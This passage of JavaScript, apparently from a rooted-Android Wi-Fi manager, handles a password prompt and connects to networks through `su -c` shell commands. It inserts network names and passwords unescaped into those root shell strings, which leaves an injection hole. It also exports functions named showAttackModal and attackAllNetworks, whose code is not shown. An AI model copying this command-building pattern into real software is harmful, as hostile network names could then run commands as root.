    setTimeout(() => {
        input.focus();
        if (isRetry) input.select();
    }, 100);
    
    toggleBtn.onclick = () => {
        if (input.type === 'password') {            
            input.type = 'text';
            toggleBtn.textContent = '🙈';
        } else {
            input.type = 'password';
            toggleBtn.textContent = '👁️';
        }
        input.focus();
    };
    
    document.getElementById('pass-cancel-btn').onclick = () => modal.remove();
    document.getElementById('pass-connect-btn').onclick = () => {
        const password = input.value.trim();            
        const shouldSave = document.getElementById('save-pass-check').checked;
        if (!password) { 
            input.style.borderColor = 'var(--accent-red)'; 
            input.focus();
            return; 
        }
        modal.remove();
        executeConnection(network, password, shouldSave, false);
    };
    
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('pass-connect-btn').click();
    });
    input.addEventListener('input', () => {
        input.style.borderColor = 'var(--border-color)';
    });
}

async function executeConnection(network, password, shouldSave, isSavedPassword) {
    try {
        if (typeof showStatus === 'function') showStatus(`🔗 Connecting to ${network.ssid}...`, 'var(--accent-blue)');
        let cmd;
        if (isNetworkOpen(network.security) || !password) {
            cmd = `su -c 'cmd wifi connect-network "${network.ssid}" open " " -b ${network.bssid}'`;
        } else {
            cmd = `su -c 'cmd wifi connect-network "${network.ssid}" wpa2 "${password}" -b ${network.bssid}'`;
        }
        await execFn(cmd);
        await new Promise(resolve => setTimeout(resolve, 3000));
        await execFn('su -c "svc wifi disable"');
        await new Promise(resolve => setTimeout(resolve, 2000));
        await execFn('su -c "svc wifi enable"');
        await new Promise(resolve => setTimeout(resolve, 4000));
        await loadCurrentNetwork();        
        
        if (currentNetwork && currentNetwork.ssid === network.ssid) {
            if (shouldSave && !isSavedPassword && password) {
                savedNetworks[network.ssid] = password;
                await saveNetworks();
                const netIndex = availableNetworks.findIndex(n => n.ssid === network.ssid);
                if (netIndex !== -1) {
                    availableNetworks[netIndex].hasPassword = true;
                }
            }
            if (typeof showStatus === 'function') {                    
                const saveMsg = (shouldSave && !isSavedPassword && password) ? ' (Password saved)' : '';
                showStatus(`✅ Connected to ${network.ssid}${saveMsg}`, 'var(--accent-green)');
            }
            renderNetworkList();
        } else {
            if (typeof showStatus === 'function') showStatus(`❌ Wrong password. Try again.`, 'var(--accent-red)');
            if (isSavedPassword) {
                delete savedNetworks[network.ssid];
                await saveNetworks();
                const netIndex = availableNetworks.findIndex(n => n.ssid === network.ssid);
                if (netIndex !== -1) {
                    availableNetworks[netIndex].hasPassword = false;
                }
            }
            setTimeout(() => showPasswordModal(network, true, password), 500);
        }
    } catch (e) {
        console.error('Connection failed:', e);
        if (typeof showStatus === 'function') showStatus('❌ Connection failed', 'var(--accent-red)');
        setTimeout(() => showPasswordModal(network, true, password), 500);
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

window.scanNetworks = scanNetworks;
window.checkAndToggleWifiBoost = checkAndToggleWifiBoost;
window.setGlobalDNS = setGlobalDNS;
window.disable24GHz = disable24GHz;
window.showAttackModal = showAttackModal;
window.attackAllNetworks = attackAllNetworks;
})();